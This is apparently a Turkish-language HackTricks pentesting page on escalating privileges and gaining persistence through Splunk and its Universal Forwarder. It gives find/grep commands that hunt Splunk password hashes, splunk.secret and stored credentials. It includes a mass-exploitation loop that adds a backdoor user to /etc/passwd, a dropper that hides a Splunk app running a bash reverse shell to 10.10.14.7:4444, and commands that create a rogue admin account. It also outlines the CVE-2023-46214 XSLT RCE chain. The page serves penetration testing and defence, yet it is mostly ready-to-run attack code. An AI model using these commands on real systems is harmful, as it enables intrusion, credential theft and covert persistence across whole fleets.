# Splunk LPE ve Persistence

{{#include ../../banners/hacktricks-training.md}}

Bir makineyi **dahili** veya **harici** olarak **enumerating** ederken **Splunk running** bulursanız (web UI için genellikle **8000**, management API için **8089**), geçerli kimlik bilgileri çoğu zaman app installation, scripted inputs veya management actions aracılığıyla **code execution** için kullanılabilir. Splunk **root** olarak running ise bu durum sıklıkla doğrudan **privilege escalation** ile sonuçlanır.

Yalnızca generic remote attack surface, enumeration veya app-upload RCE path'e ihtiyacınız varsa şuraya bakın:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Zaten **root** iseniz ve Splunk service yalnızca localhost'u dinlemiyorsa, **Splunk password hashes** çalabilir, **encrypted secrets** kurtarabilir veya yerel olarak ya da birden fazla forwarder üzerinde persistence sağlamak için **malicious app** gönderebilirsiniz.

## İlginç Yerel Dosyalar

Splunk veya Splunk Universal Forwarder running bir host'a eriştiğinizde, genellikle en ilgi çekici path'ler şunlardır:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Önemli artefaktlar:

- **`$SPLUNK_HOME/etc/passwd`**: yerel Splunk kullanıcıları ve parola hash'leri.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: Splunk'ın çeşitli `.conf` dosyalarında depolanan secret'ları şifrelemek için kullandığı anahtar.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: ilk admin bootstrap dosyası; gold image'larda ve provisioning hatalarında kullanışlıdır. `etc/passwd` zaten mevcutsa yok sayılır.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: scripted input'ların genellikle etkinleştirildiği yer.
- **`$SPLUNK_HOME/etc/deployment-apps/`** veya **`$SPLUNK_HOME/etc/apps/`**: kalıcı bir app gizlemek veya halihazırda dağıtılanları incelemek için uygun konumlar.

## Splunk Universal Forwarder Agent Exploit Özeti

Daha fazla ayrıntı için [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) adresine bakın. Bu yalnızca bir özettir:<sup>[[1]](#references)</sup>

**Exploit özeti:**
Splunk Universal Forwarder'ı (UF) hedefleyen bir exploit, **agent password** bilgisine sahip saldırganların agent'ın çalıştığı sistemlerde arbitrary code çalıştırmasına ve potansiyel olarak ortamın büyük bir bölümünü compromise etmesine olanak tanır.

**Neden çalışır:**

- UF management service genellikle **TCP 8089** üzerinde dışarıya açıktır.
- Saldırganlar API'ye authenticate olabilir ve forwarder'a **malicious app bundle** yüklemesi talimatını verebilir.
- Aynı primitive yerel olarak **LPE**, uzaktan ise **RCE** için kullanılabilir.
- **SplunkWhisperer2** gibi public tooling, app bundle'ı otomatik olarak oluşturur ve payload'ları Linux hedeflerine uyarlayabilir.

**Password'ü geri almak için yaygın yöntemler:**

- Documentation, script'ler, share'ler veya deployment automation içinde cleartext credentials.
- `$SPLUNK_HOME/etc/passwd` içindeki password hash'leri ve ardından offline cracking.
- `user-seed.conf` gibi gold image'lar veya provisioning artıkları.

**Etki:**

- Ele geçirilen her host'ta SYSTEM/root-level code execution.
- Kalıcı app'lerin, backdoor'ların veya ransomware'in deployment'ı.
- Data forward edilmeden önce telemetry'nin devre dışı bırakılması veya kurcalanması.

**Exploitation için örnek command:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Kullanılabilir public exploit'ler:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Scripted Inputs veya Malicious Apps ile Persistence

`root`/`splunk` olarak **filesystem write access** yetkiniz veya app yüklemek için authenticated access yetkiniz varsa, çok güvenilir bir persistence mekanizması **scripted input** içeren bir **custom app** bırakmaktır.<sup>[[2]](#references)</sup> Splunk'ın kendi documentation'ı, scripted input'ların bir app directory altında bulunmasını ve `inputs.conf` üzerinden etkinleştirilmesini bekler.

Tipik yerleşim:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimal `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Hızlı Linux dropper'ı:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notlar:

- Aynı trick, `/opt/splunkforwarder/etc/apps/` kullanılarak **Universal Forwarder** üzerinde de çalışır.
- Attackers, açıkça malicious bir app oluşturmak yerine legitimate bir add-on'ı değiştirerek genellikle ortama uyum sağlar.
- Bir **deployment server** üzerinde, `deployment-apps/` içine malicious bir app yerleştirmek **fleet-wide persistence**'a dönüşür; çünkü forwarder'lar güncellenen app'leri düzenli olarak sorgular, indirir ve uygulamak için genellikle yeniden başlatılır.

## Credential Theft and Admin Takeover

Splunk'ın yerel dosyalarını okuyabiliyorsanız genellikle iki iyi hedef vardır: **Splunk admin access** elde etmek ve **encrypted service credentials** kurtarmak.

### Password hashes and local users

Splunk, yerel authentication verilerini `etc/passwd` dosyasında saklar. Deployment'a bağlı olarak bu dosyayı crack etmek, web UI ve management API için geçerli credentials elde edilmesini sağlayabilir.

Zaten geçerli **admin** credentials'a sahipseniz ve Splunk **native** authentication backend kullanıyorsa, CLI'nin kendisi persistence için kullanılabilir:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` ve şifrelenmiş değerler

Splunk, birden fazla yapılandırma dosyasında depolanan hassas değerleri korumak için `etc/auth/splunk.secret` dosyasını kullanır. Hem **secret** değerini hem de ilgili **`.conf` dosyalarını** ele geçirebilirseniz çoğu zaman şunları kurtarabilir veya yeniden kullanabilirsiniz:

- `pass4SymmKey` gibi forwarder/indexer shared secret değerleri
- `sslPassword` gibi TLS private-key parolaları
- `bindDNPassword` gibi LDAP bind kimlik bilgileri

Bu, Splunk admin parolasının kendisi crack edilemese bile **lateral movement** için kullanışlıdır.

### `user-seed.conf` kötüye kullanımı

`user-seed.conf` yalnızca ilk başlatma sırasında veya `etc/passwd` mevcut olmadığında okunur. Bu nedenle çalışan bir sistemde daha az kullanışlıdır; ancak şu durumlarda oldukça ilgi çekicidir:

- ele geçirilmiş installation template'leri
- container image'ları
- unattended provisioning workflow'ları
- Splunk'ın otomatik olarak yeniden başlatıldığı appliance'lar

Bu durumlarda `splunk hash-passwd` ile oluşturulmuş bir `HASHED_PASSWORD` yerleştirmek, yeniden deployment sonrasında admin erişimini sessizce geri kazanmanızı sağlar.

## Splunk Sorgularını Kötüye Kullanma

Daha fazla ayrıntı için [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) adresine bakın.<sup>[[3]](#references)[[4]](#references)</sup>

Yakın zamanda kullanılan etkili bir technique, güvenlik açığı bulunan Splunk Enterprise sürümlerinde **user-supplied XSLT**'yi kötüye kullanarak düşük ayrıcalıklı, kimliği doğrulanmış bir hesabı **`splunk` kullanıcısı** olarak **OS command execution** elde edecek şekilde yükseltmektir.

Üst düzey akış:

1. Splunk'ta kimlik doğrulaması yapın.
2. Preview/upload functionality üzerinden kötü amaçlı bir **XSL** dosyası yükleyin.
3. Splunk'ın arama sonuçlarını, yüklenen stylesheet'i **dispatch** dizininden kullanarak render etmesini sağlayın.
4. XSLT payload'ını kullanarak bir dosya yazın veya Splunk'ın search pipeline'ı üzerinden execution tetikleyin (örneğin `runshellscript` gibi internal functionality'ye ulaşarak).

Saldırı açısından önemli çıkarım, bu yolun **app upload** gerektirmeyen **post-auth RCE** sağlamasıdır. Linux üzerinde genellikle **`splunk`** hesabına erişim elde edersiniz; bu yine de değerlidir, çünkü bu kullanıcı çoğu zaman application tree'nin sahibidir, secret'ları okuyabilir ve shell erişimi kaybedilse bile varlığını sürdüren persistent app'ler yerleştirebilir.

Exploitation sırasında kullanılan temsili bir path şöyledir:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Splunk çok fazla ayrıcalıkla çalışıyorsa veya `splunk` kullanıcısının tehlikeli script'lere, yazılabilir service unit'lerine ya da hatalı `sudo` kurallarına erişimi varsa bu, net bir **LPE** zincirine dönüşür.

## Referanslar

- [1] [RCE ve Persistence için Splunk Forwarder'larını Kötüye Kullanma](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [TraitorWare'e Dikkat: Persistence için Splunk Kullanma](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214 Analizi: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)

{{#include ../../banners/hacktricks-training.md}}
